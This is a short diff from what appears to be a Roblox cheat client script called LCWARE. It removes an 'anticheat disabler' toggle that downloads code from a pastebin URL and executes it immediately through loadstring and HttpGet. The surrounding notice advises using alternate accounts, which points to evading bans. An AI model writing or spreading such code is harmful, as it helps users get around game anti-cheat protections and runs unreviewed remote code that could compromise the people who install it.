@@ -1054,13 +1054,3 @@ infonotify("LCWARE", "Remember to use always alts.", 10)
 
 
 
-local AnticheatDisabler = COB("World", {
-    Name = "UniversalTag",
-    Function = function(callback) 
-        if callback then
-        loadstring(game:HttpGet(('https://pastebin.com/raw/kecte0C5'),true))()
-        end
-    end,
-    Default = false,
-    HoverText = "not working on bedwars but its fe"
-})
